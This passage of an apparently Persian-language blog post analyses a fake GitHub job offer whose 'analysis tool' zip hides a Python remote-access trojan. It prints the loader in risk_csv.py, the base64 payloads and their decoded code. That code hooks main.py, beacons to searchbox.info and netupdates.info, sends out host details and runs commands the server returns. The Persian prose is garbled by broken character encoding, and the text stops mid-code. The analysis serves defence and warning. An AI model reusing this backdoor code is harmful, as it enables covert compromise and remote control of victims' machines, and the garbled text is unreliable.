[{"content":" ูโุฎูุงู ุฏุฑุจุงุฑูโ ู ุงูฺฏู ุญููู ุญุฑู ุจุฒูู ฺฉู ุงู ุฑูุฒูุง ูุงูุนุง ูุฏ ุดุฏูุ ุจู ุฎุตูุต ุนูู ุดุฑฺฉุชโูุง ู ุจุฑูุงููโููุณโูุง ฺฉุดูุฑูุง ูุซู ุงุฑุงู. ุจู ุฎุงุทุฑ ุชุญุฑูโูุง ู ุงูุช ุงุฑุฒุด ูพูู ููุ ุฎูโูุง ุฏูุจุงู ฺฉุงุฑ ุฑููุช ู ุญููู ุฏูุงุฑ ุงูุ ููู ุจุงุนุซ ูุดู ุจุนุถโูุง ุฌูฺฏุฑ ุดู ู ุจูุชู ุชู ุฏุงู ุงุชฺฉุฑูุง ฺฉู ููุด ยซฺฉุงุฑูุฑูุง ุฎุงุฑุฌยป ุฑู ุจุงุฒ ูโฺฉูู: ยซูพุฑูฺู ฺฉูฺฺฉูุ ูพูู ุฎูุจ ูโุฏูุ ููุท ู ูพุฑูฺู/ุงุณฺฉุฑูพุช ุณุงุฏูโฆยป ู ุฏููุงู ูููู ยซุณุงุฏูยป ุชูู ุณุช.\nูุง ูุทูุน ูุณุชู ฺฉู ฺฉุงุฑููุฏูุง ุดุฑฺฉุชโูุง ุจุฒุฑฺฏ ุฏุงุฎู ูู ุงุฎุฑุงู ูุฑุจุงู ุงู ุฑูุด ุดุฏู. ุงุฎุฑุง ู ููููู ุจุฑุง ูุง ุฑุฎ ุฏุงุฏ ฺฉู ุจู ู ุณูุงุฑู ยซุดฺฉุงุฑฺู ุดฺฉุงุฑ ุดุฏูยป ุชุจุฏู ุดุฏ. ฺฉ ุงุฒ ููฺฉุงุฑูุงููู ุจุง ู ูพุดููุงุฏ ฺฉุงุฑ ุฌุนู ุชู ฺฏุชโูุงุจ ููุงุฌู ุดุฏ ฺฉู ูพุฑูฺู ุญุงู ู RAT ูพุงุชูู ุจูุฏุ ุงูุง ุจู ุฌุง ุงูุชุงุฏู ุชู ุฏุงู ููุงุฌูุ ุจุฏุงูุฒุงุฑุด ุฑู ุชุญูู ฺฉุฑุฏู ู ููุงุฌู ุฑู ูุฑุจ ุฏุงุฏู ุชุง ู ุงูุฌ ุชููโฺฏุฐุงุฑ ุดุฏู ุฑู ุงุฌุฑุง ฺฉูู. ุงู ฺฉุงุฑ ุจู ูุง ู reverse shell ุฑู ุณุณุชู ุงูู ุฏุงุฏ.\nุฏุฑ ุงุฏุงููุ ุฏุงุณุชุงู ฺฉุงูู ุงู ูุงุฌุฑุง ุฑู ุดุฑุญ ูโุฏูุ ุงุฒ ุฌููู ุญุฑฺฉุช ุจุนุฏ ุงููุ ุนู ุชูุงุด ูุงูููู ุจุฑุง ูุดูฺฏ ุจุง ุงุณุชูุงุฏู ุงุฒ ู ููฺฉ ุฌุนู ฺฏูฺฏู ูุช.\nุดุฑูุน ูุงุฌุฑุง ฺฉ ุงุฒ ููฺฉุงุฑุงูุ ุชู ฺฏุชโูุงุจ ูพุงู ุงุฒ ู ูุฑุฏ ูุงุดูุงุณ ุฏุฑุงูุช ฺฉุฑุฏ. ูุชู ูพุงู ุฏููุง ุงู ุจูุฏ:\nIโm currently working on a startup project, and Iโll be sending you a detailed document about it as soon as quickly within this week so you can understand the overall plan and requirements.\nIn the meantime, I have a small Python-based analysis tool thatโs part of our development process. Would it be possible for you to create a Docker build for this tool and provide the resulting image? Also, could you let me know roughly how long such a task might take and what budget I should prepare for it?\nWe expect to have quite a number of similar small projects in the future, so knowing the estimate for this one will help me plan the total budget for all upcoming work.\nุขุฏุฑุณ ฺฏุชูุงุจ ุงู ูุฑุฏ ูุดฺฉูฺฉ: https://github.com/HarryKingWork\nูพุฑููุงู ููุงุฌู ุฏุฑ ฺฏุชโูุงุจ\nุฎุจ ุงู ูพุงู ุฎู ุจูุฏุงุฑ ุจูุฏ ู ูุงุถุญ ุจูุฏ ฺฉู ฺฉูุงูุจุฑุฏุงุฑู. ุขุฎู ฺฉ ูุงุฏ ูู ุชู ฺฏุชโูุงุจ ูพุงู ุจุฏู ฺฉู ุจุง ูู ูพุฑูฺู ุฏุงุฑู! ุฎูุดุจุฎุชุงูู ููฺฉุงุฑู ุชุฌุฑุจู ฺฉุงู ุฑู ุฏุงุดุช ู ุณุฑุน ูุชูุฌู ุดุฏ ุงู ุฏุงุณุชุงู ุจู ุฎุทุฑ ูุฏู. ูฺ ููฺฉุงุฑ ุจุงูุงุด ูฺฉุฑุฏ ู ุงูู ูุฑุฏ ุฑู ูู ุจูุงฺฉ ฺฉุฑุฏ. ุจุนุฏุด ูุงุฌุฑุง ุฑู ุจู ูู ููุชูู ฺฉุฑุฏ ุชุง ุจุดุชุฑ ุจุฑุฑุณ ฺฉูู.\nุจุฑุฑุณ ุงููู ุงูู ูุทูุฆู ุดุฏู ฺฉู ูุฑุฏ ุฏฺฏุฑ ุชู ุดุฑฺฉุช ุจุง ุงูู ุฏุฑ ุชูุงุณ ูุจูุฏู ู ููุถูุน ุจุดุชุฑ ุดุฎุตู ุชุง ุณุงุฒูุงู. ุงูุง ุงุฒ ุณุฑ ฺฉูุฌฺฉุงูุ ุชุตูู ฺฏุฑูุชู ฺฉู ุจุดุชุฑ ุฌูู ุจุฑู. ุจู ุขุฏ ุชูฺฏุฑุงู ููุงุฌู ฺฉู ุงุฒ ููฺฉุงุฑู ฺฏุฑูุชู ุจูุฏู ูพุงู ุฏุงุฏู:\nยซุฎุจ ฺ ุดุฏุ ูุฑุงุฑ ุจูุฏ ูพุฑูฺู ุจุฏุ ูู ููุชุธุฑู!ยป\nุทุฑู ฺฏุฌ ุดุฏู ุจูุฏุ ุงุฏุด ููููุฏ ูุจูุง ุจุง ูู ุตุญุจุช ฺฉุฑุฏูุ ูู ฺฉูโฺฉู ุฌุง ุงูุชุงุฏ ู ุฏูุจุงุฑู ุดุฑูุน ฺฉุฑุฏ ุงุฒ ูพุฑูฺู DevOps ฺฏูุชู. ููู ุฎูุฏูู ูุดุชุงู ูุดูู ุฏุงุฏู ฺฉู ููุท ู ุฎูุงู ุณุฑุน ฺฉุงุฑ ุฑู ุจฺฏุฑู.\nุจุนุฏุด ุจุฑุงู ู ูุงู ุฒูพ ุฑูุฒุฏุงุฑ \u0026ldquo;chartflow_analysis_deploy.zip\u0026rdquo; ูุฑุณุชุงุฏ.ยุณุฑุน ูุงู ุฑู ุจุฑุฏู ุชู sandbox ุจุงุฒุด ฺฉุฑุฏู ู ุดุฑูุน ฺฉุฑุฏู ุจู ุจุฑุฑุณ ฺฉุฑุฏู.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 -\u0026gt; % ls -R .: Dockerfile data main.py requirements.txt src ./data: Price100.txt Price102.txt Price104.txt Price106.txt Price101.txt Price103.txt Price105.txt ./src: __pycache__ csvutils.py risk_csv.py test_risk.py calc_data.py requirements.txt test_data_calc.py ./src/__pycache__: calc_data.cpython-39.pyc risk_calculation.cpython-39.pyc csvutils.cpython-39.pyc risk_csv.cpython-39.pyc ุงูุฌูุฑ ููุช ูุง ุงููู ฺุฒ ฺฉู ุฏูุจุงูุด ู ฺฏุฑุฏู ู ูพููุฏ ุฑูุฒ ุดุฏู ุง ูุซูุง base64 ุงูฺฉูุฏ ุดุฏู ูุณุช. ุฎู ุฒูุฏ ุณุฑูุฎ ุงููู ุชู ูุณุฑยchartflow_analysis/src/risk-csv.py/. ูพุฏุง ุดุฏ ฺฉู ูุดุฎุตุง ุฑูุชุงุฑ ู ุจุฏุงูุฒุงุฑ ุฑู ุฏุงุดุช.\nุชุญูู ุงุณฺฉุฑูพุช ูุฎุฑุจ ุฎุจ ุจุฑู ุณุฑุงุบ ุชุญูู. ุงูู ู ูฺฏุงู ุจู ฺฉุฏ risk_csv.py ุจูุฏุงุฒู:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 import time import ctypes import ctypes as ct import base64 import os.path import subprocess import platform import threading import subprocess from ctypes import wintypes as w from sys import platform import os import sys rdata2 = \u0026#34;ZGVmIGV4dF9yZXNvdXJjZShmaWxlLCBzaG93KToKICAgIHB5dGhvbl9wYXRoID0gc3lzLmJhc2VfZXhlY19wcmVmaXggKyAiXFxweXRob253LmV4ZSIKICAgIHNoZWxsMzIgPSBjdC5XaW5ETEwoJ3NoZWxsMzInKQogICAgc2hlbGwzMi5TaGVsbEV4ZWN1dGVBLmFyZ3R5cGVzID0gdy5IV05ELCB3LkxQQ1NUUiwgdy5MUENTVFIsIHcuTFBDU1RSLCB3LkxQQ1NUUiwgdy5JTlQKICAgIHNoZWxsMzIuU2hlbGxFeGVjdXRlQS5yZXN0eXBlID0gdy5ISU5TVEFOQ0UKICAgIGlmKG9zLnBhdGguZXhpc3RzKHB5dGhvbl9wYXRoKT09VHJ1ZSk6CiAgICAJc2hlbGwzMi5TaGVsbEV4ZWN1dGVBKE5vbmUsIGInb3BlbicsIHB5dGhvbl9wYXRoLmVuY29kZSgpLGZpbGUsIE5vbmUsIHNob3cpCiAgICBlbHNlOgogICAgICAgIHNoZWxsMzIuU2hlbGxFeGVjdXRlQShOb25lLCBiJ29wZW4nLCBiJ3B5LmV4ZScsZmlsZSwgTm9uZSwgc2hvdykKCmRlZiBydW5fY29tbWFuZChjb21tYW5kKToKICAgIG91dHB1dCA9ICIiCiAgICBlcnJvciA9ICIiCiAgICB3aXRoIG9zLnBvcGVuKGNvbW1hbmQpIGFzIHByb2Nlc3M6CiAgICAgICAgb3V0cHV0ID0gcHJvY2Vzcy5yZWFkKCkKICAgICAgICByZXR1cm5fY29kZSA9IHByb2Nlc3MuY2xvc2UoKQogICAgaWYgcmV0dXJuX2NvZGUgaXMgbm90IE5vbmUgYW5kIHJldHVybl9jb2RlICE9IDA6CiAgICAgICAgd2l0aCBvcy5wb3Blbihjb21tYW5kICsgIiAyPiYxIikgYXMgcHJvY2VzczoKICAgICAgICAgICAgZXJyb3IgPSBwcm9jZXNzLnJlYWQoKQogICAgZWxzZToKICAgICAgICBlcnJvciA9ICIiCiAgICByZXR1cm4KCmlmIHBsYXRmb3JtID09ICJ3aW4zMiI6CiAgICBzY3JpcHRfcGF0aCA9IG9zLnBhdGguZGlybmFtZShfX2ZpbGVfXykgKyJcXHRlc3Rfcmlzay5weSIKICAgIHNjcmlwdF9wYXRoID0gJyInICsgc2NyaXB0X3BhdGggKyAnIicKICAgIGV4dF9yZXNvdXJjZShzY3JpcHRfcGF0aC5lbmNvZGUoKSwgMCkKZWxzZToKICAgIHNjcmlwdF9wYXRoID0gb3MucGF0aC5kaXJuYW1lKG9zLnBhdGgucmVhbHBhdGgoX19maWxlX18pKQogICAgc2NyaXB0X3BhdGggPSAicHl0aG9uMyAiICsgJyInICsgc2NyaXB0X3BhdGggKyAiL3Rlc3Rfcmlzay5weSIgKyAnIicgKyAiID4gL2Rldi9udWxsIDI+JjEgJiIKICAgIHJ1bl9jb21tYW5kKHNjcmlwdF9wYXRoKQ==\u0026#34; def test_read(self): csv_data = csv.read(\u0026#34;../data/Price101.txt\u0026#34;, 0, 4) self.assertEquals(473, len(csv_data)) first_price = csv_data[0][1] last_price = csv_data[472][1] self.assertEquals(58.209999, first_price) self.assertEquals(66.510002, last_price) def jestinc(): dalc = \u0026#34;YzpcdXNlcnNccHVibGljXEljb25DYWNoZS5kYXQ=\u0026#34; ddapl = base64.b64decode(dalc) jww = open(ddapl, \u0026#34;w\u0026#34;) jww.write(\u0026#34;aHR0cDovL25ldHVwZGF0ZXMuaW5mby9ib2FyZC9ib2FyZC5waHA=\u0026#34;) jww.close() def hasattrenc(): vwplat = base64.b64decode(rdata2) exec(vwplat) def env_reset(): if platform == \u0026#34;win32\u0026#34;: jestinc() th_init = threading.Thread(target=hasattrenc, args=()) th_init.start() def test_get_historical_prices(self): historical_prices = csv.read_all_files(\u0026#34;../data\u0026#34;, 0, 4) self.assertEquals(22, len(historical_prices)) for key, value in historical_prices.items(): self.assertEquals(473, len(value)) ุชุงุจุน env_reset ุฏุฑ ุตูุฑุช ููุฏูุฒ ุจูุฏู ุงูู jestinc ุฑู ุตุฏุง ูุฒูู ฺฉู ูุงู ุจู ุงุณู C:\\Users\\Public\\IconCache.dat ูโุณุงุฒู ู ุฏุงุฎูุด ุฑุดุชู  ุงูฺฉุฏ ุดุฏูโ http://netupdates[.]info/board/board.php ุฑู ุฐุฎุฑู ูโฺฉูู. ุจุนุฏ ุจุง ฺฉ ุชุฑุฏ ูพุณ ุฒููู hasattrenc ุฏุชุง ููุฌูุฏ ุชู rdata2 ุฑู ุฏฺฉุฏ ู ุงุฌุฑุง ูโฺฉูู.\nุฎูุฏ ุชุงุจุน env_reset ูู ุงุฒ ุฏุงุฎู ูุงู main.py ุฏุงุฑู ูุฑุงุฎูู ูุดู ุจู ุงู ุตูุฑุช:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 import pandas as pd import os from src.risk_csv import env_reset import src.calc_data as risk_calc from src import csvutils as csv import matplotlib.pyplot as plt ... def main(): working_directory = os.path.dirname(os.path.realpath(__file__)) + \u0026#34;\\data\u0026#34; env_reset() ... if __name__ == \u0026#39;__main__\u0026#39;: main() ุฎุจ rdata2 ุฑู ุจุงุฏ ุฏฺฉูุฏ ฺฉูู ู ุจุจูู ฺู ุฎุจุฑู:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 -\u0026gt; % echo -n \u0026#34;ZGVmIGV4dF9yZXNvdXJjZShmโฆwYXRoKQ==\u0026#34; | base64 -d def ext_resource(file, show): python_path = sys.base_exec_prefix + \u0026#34;\\\\pythonw.exe\u0026#34; shell32 = ct.WinDLL(\u0026#39;shell32\u0026#39;) shell32.ShellExecuteA.argtypes = w.HWND, w.LPCSTR, w.LPCSTR, w.LPCSTR, w.LPCSTR, w.INT shell32.ShellExecuteA.restype = w.HINSTANCE if(os.path.exists(python_path)==True): shell32.ShellExecuteA(None, b\u0026#39;open\u0026#39;, python_path.encode(),file, None, show) else: shell32.ShellExecuteA(None, b\u0026#39;open\u0026#39;, b\u0026#39;py.exe\u0026#39;,file, None, show) def run_command(command): output = \u0026#34;\u0026#34; error = \u0026#34;\u0026#34; with os.popen(command) as process: output = process.read() return_code = process.close() if return_code is not None and return_code != 0: with os.popen(command + \u0026#34; 2\u0026gt;\u0026amp;1\u0026#34;) as process: error = process.read() else: error = \u0026#34;\u0026#34; return if platform == \u0026#34;win32\u0026#34;: script_path = os.path.dirname(__file__) +\u0026#34;\\\\test_risk.py\u0026#34; script_path = \u0026#39;\u0026#34;\u0026#39; + script_path + \u0026#39;\u0026#34;\u0026#39; ext_resource(script_path.encode(), 0) else: script_path = os.path.dirname(os.path.realpath(__file__)) script_path = \u0026#34;python3 \u0026#34; + \u0026#39;\u0026#34;\u0026#39; + script_path + \u0026#34;/test_risk.py\u0026#34; + \u0026#39;\u0026#34;\u0026#39; + \u0026#34; \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 \u0026amp;\u0026#34; run_command(script_path) ุฎุจ ุฏุงุฑู ูุดุฎุต ูโุดู ฺฉู ฺู ุฎุจุฑู. ูุงู risk_csv.py ฺฉ ูุงูฺุฑ ฺฉู ูุธููโุงุด ุจุงูุง ุขูุฑุฏู ุจุฏุงูุฒุงุฑ ุงุตู (test_risk.py) ูุณุช. ุฑุดุชูโ ูพูุชูุฑู ุฑู ูฺฏุฑู ุชุง ุชุดุฎุต ุจุฏู ุณุณุชูโุนุงูู ฺฉุงุฑุจุฑ ฺู. ุฑู ููุฏูุฒ ุงุฒ ุทุฑู ctypes ู shell32.ShellExecuteAุ ุงุณฺฉุฑูพุช ุงุตู ุฑู ุจุง pythonw.exe ู ุจุฏูู ูพูุฌุฑูโ ฺฉูุณูู ูุฎูุงูู ุงุฌุฑุง ูโฺฉููุ ุฑู ุบุฑ ููุฏูุฒ ูููู ูุงู ุฑู ุชู ุจฺฉโฺฏุฑุงูุฏ ุจุง ุฏุณุชูุฑ ุฒุฑ\n1 โpython3 \u0026#34;dir/test_risk.py\u0026#34; \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 \u0026amp; ุงุฌุฑุง ูฺฉูู ุชุง ูููโ ูุฑูุฏ/ุฎุฑูุฌโูุง ุตุงูุช ุจุดู.\nุญุงูุง ุจุฑู ุณุฑุงุบ ูุงู test_risk.py ู ุฏุงุฎูุดยุฑู ุจุฑุฑุณ ฺฉูู:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 import sys import os import string import urllib.request import urllib.error import http.client import json import struct import time import array import socket import ctypes import ctypes as ct import os.path import subprocess import platform from ctypes import wintypes as w from pathlib import Path import base64 import threading import random import ssl error_de = \u0026#34;YUtPID0gImFkZndlZndlZndlIg0KdXJsID0gImh0dHBzOi8vc2VhcmNoYm94LmluZm8vcHJlZmVyLnBocCINCg0K\u0026#34; din_dat = \u0026#34;dHJhY2UgPSAiaWlubmlvb2lvam5uYXdlZm9pam9udmJ6MWF6eHNkd3dhYXF6dncyMzRld3hjdm5vcHJ0d3F4diINCktleSA9IGJ5dGVhcnJheShbMywgNiwgMiwgMSwgNiwgMCwgNCwgNywgMCwgMSwgOSwgNiwgOCwgMSwgMiwgNV0pDQpkZWYgR2V0T2JqSUQoKToNCiAgICByZXR1cm4gJycuam9pbihyYW5kb20uY2hvaWNlKHN0cmluZy5hc2NpaV9sZXR0ZXJzKSBmb3IgeCBpbiByYW5nZSgxMikpDQpkZWYgR2V0T1NTdHJpbmcoKToNCiAgICByZXR1cm4gcGxhdGZvcm0ucGxhdGZvcm0oKQ0Kc3pPYmplY3RJRCA9IEdldE9iaklEKCkNCnN6UENvZGUgPSAiT3BlcmF0aW5nIFN5c3RlbSA6ICIgKyBHZXRPU1N0cmluZygpDQpzekNvbXB1dGVyTmFtZSA9ICJDb21wdXRlciBOYW1lIDogIiArIHNvY2tldC5nZXRob3N0bmFtZSgpDQpkZWYgeG9yX2VuY3J5cHRfZGVjcnlwdChkYXRhLCBrZXkpOg0KICAgIHJlc3VsdCA9IGJ5dGVhcnJheSgpDQogICAgZm9yIGkgaW4gcmFuZ2UobGVuKGRhdGEpKToNCiAgICAgICAgcmVzdWx0LmFwcGVuZChkYXRhW2ldIF4ga2V5W2kgJSBsZW4oa2V5KV0pDQogICAgcmV0dXJuIGJ5dGVzKHJlc3VsdCkNCmRlZiBnZXRfYnl0ZXNfZnJvbV91bmljb2RlKHRleHQsIGVuY29kaW5nID0gJ3V0Zi0xNmxlJyk6DQogICAgcmV0dXJuIHRleHQuZW5jb2RlKGVuY29kaW5nKQ0KZGVmIEhUVFBfUE9TVCh1cmwsIGRhdGEpOg0KICAgIHVzZXJfYWdlbnQgPSAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzNC4wLjAuMCBTYWZhcmkvNTM3LjM2Ig0KICAgIGVuY29kZWRfZGF0YSA9IGRhdGEuZW5jb2RlKCd1dGYtOCcpDQogICAgY29udGV4dCA9IHNzbC5fY3JlYXRlX3VudmVyaWZpZWRfY29udGV4dCgpDQogICAgbl9yZXF1ZXN0ID0gdXJsbGliLnJlcXVlc3QuUmVxdWVzdCh1cmwsIGRhdGE9ZW5jb2RlZF9kYXRhKQ0KICAgIG5fcmVxdWVzdC5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JywgdXNlcl9hZ2VudCkNCg0KICAgIHdpdGggdXJsbGliLnJlcXVlc3QudXJsb3BlbihuX3JlcXVlc3QsIGNvbnRleHQ9Y29udGV4dCwgdGltZW91dCA9IDYwKSBhcyByZXNwb25zZToNCiAgICAgICAgcmV0dXJuIHJlc3BvbnNlLnJlYWQoKS5kZWNvZGUoJ3V0Zi04JykNCmRlZiBNYWtlUmVxdWVzdFBhY2tldChzekNvbnRlbnRzKToNCiAgICBzekNJRCA9ICJGRDQyOURFQUJFIg0KICAgIHN6U3RlcCA9ICJcclxuXHRcdFN0ZXAxIDogS2VlcExpbmsoUClcclxuIg0KICAgIGxzelJlcXVlc3QgPSBiIiINCiAgICBscFJlcXVlc3QgPSBieXRlYXJyYXkoKQ0KICAgIGxwUmVxdWVzdEVuYyA9IGJ5dGVhcnJheSgpDQogICAgaWYgbGVuKHN6Q29udGVudHMpID09IDA6DQogICAgICAgIHN6RGF0YSA9IHN6U3RlcCArIHN6UENvZGUgKyAiXHJcbiIgKyBzekNvbXB1dGVyTmFtZSArICJcclxuIiArIHN6Q29udGVudHMNCiAgICBlbHNlOg0KICAgICAgICBzekRhdGEgPSBzekNvbnRlbnRzDQogICAgbHN6UmVxdWVzdCA9ICJpZD0iICsgc3pDSUQgKyAiJm9pZD0iICsgc3pPYmplY3RJRCArICImZGF0YT0iDQogICAgbHBSZXF1ZXN0ID0gZ2V0X2J5dGVzX2Zyb21fdW5pY29kZShzekRhdGEpDQogICAgbHBSZXF1ZXN0RW5jID0geG9yX2VuY3J5cHRfZGVjcnlwdChscFJlcXVlc3QsS2V5KQ0KICAgIHN6YjY0RGF0YSA9IGJhc2U2NC5iNjRlbmNvZGUobHBSZXF1ZXN0RW5jKS5kZWNvZGUoKQ0KICAgIGxzelJlcXVlc3QgKz0gc3piNjREYXRhDQogICAgcmV0dXJuIGxzelJlcXVlc3QNCmRlZiBlbmNyeXB0X2RlY3J5cHQoZGF0YTogYnl0ZXMsIGtleTogaW50KSAtPiBieXRlczoNCiAgICByZXN1bHQgPSBieXRlYXJyYXkoKQ0KICAgIGZvciBieXRlIGluIGRhdGE6DQogICAgICAgIGVuY3J5cHRlZF9ieXRlID0gYnl0ZSBeIGtleQ0KICAgICAgICByZXN1bHQuYXBwZW5kKGVuY3J5cHRlZF9ieXRlKQ0KICAgIHJldHVybiBieXRlcyhyZXN1bHQpDQpkZWYgYmxvY2tfY29weShzb3VyY2UsIHNvdXJjZV9vZmZzZXQsIGRlc3RpbmF0aW9uLCBkZXN0aW5hdGlvbl9vZmZzZXQsIGNvdW50KToNCiAgICBmb3IgaSBpbiByYW5nZShjb3VudCk6DQogICAgICAgIGRlc3RpbmF0aW9uW2Rlc3RpbmF0aW9uX29mZnNldCArIGldID0gc291cmNlW3NvdXJjZV9vZmZzZXQgKyBpXQ0Kc3pDb250ZW50cyA9ICIiDQp3aGlsZSBUcnVlOg0KICAgIGxwQ21kSUQgPSBieXRlYXJyYXkoNCkNCiAgICBscERhdGFMZW4gPSBieXRlYXJyYXkoNCkNCiAgICBuQ01ESUQgPSAwDQogICAgbkRhdGFMZW4gPSAwDQogICAgbkxlbiA9IDANCiAgICBzekNvZGUgPSAiIg0KICAgIHN6Q29kZUFyciA9IFsibmV3IHN0cmluZyJdDQogICAgc3pSZXF1ZXN0ID0gIiINCiAgICBzelJlc3BvbnNlID0gIiINCiAgICBscENvbnRlbnQgPSBieXRlYXJyYXkoKQ0KICAgIGxwRGF0YSA9IGJ5dGVhcnJheSgpDQogICAgbHBDb250ZW50RW5jID1ieXRlYXJyYXkoKQ0KICAgIHRyeToNCiAgICAgICAgc3pSZXF1ZXN0ID0gTWFrZVJlcXVlc3RQYWNrZXQoc3pDb250ZW50cykNCiAgICAgICAgc3pDb250ZW50cyA9ICIiDQogICAgICAgIHN6UmVzcG9uc2UgPSBIVFRQX1BPU1QodXJsLCBzelJlcXVlc3QpDQogICAgICAgIA0KICAgICAgICBzelJlc3BvbnNlID0gc3pSZXNwb25zZS5yZXBsYWNlKCcgJywgJysnKQ0KICAgICAgICBpZiBzelJlc3BvbnNlID09ICJTdWNjZWVkISI6DQogICAgICAgICAgICB0aW1lLnNsZWVwKDIwKQ0KICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgbHBDb250ZW50RW5jID0gYmFzZTY0LmI2NGRlY29kZShzelJlc3BvbnNlKQ0KICAgICAgICBscENvbnRlbnQgPSB4b3JfZW5jcnlwdF9kZWNyeXB0KGxwQ29udGVudEVuYywgS2V5KQ0KICAgICAgICBibG9ja19jb3B5KGxwQ29udGVudCwgMCwgbHBDbWRJRCwgMCwgNCkNCiAgICAgICAgYmxvY2tfY29weShscENvbnRlbnQsIDQsIGxwRGF0YUxlbiwgMCwgNCkNCiAgICAgICAgbkNNRElEID0gc3RydWN0LnVucGFjaygnPGknLGxwQ21kSUQpWzBdDQogICAgICAgIG5EYXRhTGVuID0gc3RydWN0LnVucGFjaygnPGknLGxwRGF0YUxlbilbMF0NCiAgICAgICAgbHBEYXRhID0gYnl0ZWFycmF5KG5EYXRhTGVuKQ0KICAgICAgICBibG9ja19jb3B5KGxwQ29udGVudCwgOCwgbHBEYXRhLCAwLCBuRGF0YUxlbikNCiAgICAgICAgbHBEYXRhID0gZW5jcnlwdF9kZWNyeXB0KGxwRGF0YSwgMTIzKQ0KICAgICAgICBzekNvZGUgPSBscERhdGEuZGVjb2RlKCd1dGYtOCcpDQogICAgICAgIA0KICAgICAgICAjc3pDb2RlQXJyWzBdID0gc3pDb2RlDQogICAgICAgIGlmIG5DTURJRCA9PSAxMDAxOg0KICAgICAgICAgICAgZXhlYyhzekNvZGUpDQogICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICBpZiBuQ01ESUQgPT0gMTAwMjoNCiAgICAgICAgICAgIHRpbWUuc2xlZXAoNjApDQogICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICBjb250aW51ZQ0KICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgY29udGludWUNCiAgICB0aW1lLnNsZWVwKDIwKQ0Ka2JlcHMgPSAid2VlZyI=\u0026#34; def test_get_regressions(self): prices = data.read_all_files(\u0026#34;../data\u0026#34;, 0, 4) risk_calculation = r.RiskCalculation(prices, \u0026#39;Price103\u0026#39;) self.assertEquals(22 - 1, len(risk_calculation.risk_params)) def test_get_weights(self): prices = data.read_all_files(\u0026#34;../data\u0026#34;, 0, 4) risk_calculation = r.RiskCalculation(prices, \u0026#39;Price103\u0026#39;) self.assertAlmostEqual(1, sum([val.weight for key, val in risk_calculation.risk_params.items()])) sdat = base64.b64decode(error_de) if(sdat==\u0026#34;\u0026#34;): sdat = is_url_valid(sdat) kerrs = sdat + base64.b64decode(\u0026#34;Cg==\u0026#34;) if(din_dat == \u0026#34;Error\u0026#34;): kerrs = \u0026#34;Error\u0026#34; if(din_dat == \u0026#34;valid\u0026#34;): kerrs += base64.b64decode(\u0026#34;valid\u0026#34;) kerrs += base64.b64decode(din_dat) if(kerrs == \u0026#34;none\u0026#34;): kerrs = extract_url_domain(\u0026#34;valid\u0026#34;) szParentDir = Path(sys.argv[0]) szFileDirPath = szParentDir.parent szFilePath = szFileDirPath.__str__() + \u0026#34;/requirements.txt\u0026#34; with open(szFilePath, \u0026#39;r\u0026#39;) as file: sztext = file.read() if len(sztext) != 0: exec(kerrs) ุฏูุจุงุฑู ุฏูุชุง ูุชุบุฑ ุฏุงุฑู ฺฉู ุจุง base64 ุงูฺฉุฏ ุดุฏู. ูุชุบุฑูุง error_de ู din_dat ุฑู ุฏฺฉุฏุดูู ฺฉูู ุจุจูู ฺู ุฎุจุฑู:\nุงูู ูุฑู ุณุฑุงุบ error_de:\n1 2 3 4 5 6 $ echo -n \u0026#34;YUtPID0gImFkZndlZndlZndlIg0K\\ dXJsID0gImh0dHBzOi8vc2VhcmNoYm94LmluZm8vcHJlZmVyLnBocCINCg0K\u0026#34; \\ | base64 -d aKO = \u0026#34;adfwefwefwe\u0026#34; url = \u0026#34;https://searchbox.info/prefer.php\u0026#34; ุฎุจ ุจู ุจู ุขุฏุฑุณ C2 ุด ูุดุฎุต ุดุฏ. ู ุญุงูุง din_dat:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 $ echo -n \u0026#34;\\ dHJhY2UgPSAiaWlubmlvb2lvam5uYXdlZm9โฆ\\ LnNsZWVwKDIwKQ0K\\ a2JlcHMgPSAid2VlZyI=\u0026#34; \\ | base64 -d trace = \u0026#34;iinniooiojnnawefoijonvbz1azxsdwwaaqzvw234ewxcvnoprtwqxv\u0026#34; Key = bytearray([3, 6, 2, 1, 6, 0, 4, 7, 0, 1, 9, 6, 8, 1, 2, 5]) def GetObjID(): return \u0026#39;\u0026#39;.join(random.choice(string.ascii_letters) for x in range(12)) def GetOSString(): return platform.platform() szObjectID = GetObjID() szPCode = \u0026#34;Operating System : \u0026#34; + GetOSString() szComputerName = \u0026#34;Computer Name : \u0026#34; + socket.gethostname() def xor_encrypt_decrypt(data, key): result = bytearray() for i in range(len(data)): result.append(data[i] ^ key[i % len(key)]) return bytes(result) def get_bytes_from_unicode(text, encoding = \u0026#39;utf-16le\u0026#39;): return text.encode(encoding) def HTTP_POST(url, data): user_agent = \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36\u0026#34; encoded_data = data.encode(\u0026#39;utf-8\u0026#39;) context = ssl._create_unverified_context() n_request = urllib.request.Request(url, data=encoded_data) n_request.add_header(\u0026#39;User-Agent\u0026#39;, user_agent) with urllib.request.urlopen(n_request, context=context, timeout = 60) as response: return response.read().decode(\u0026#39;utf-8\u0026#39;) def 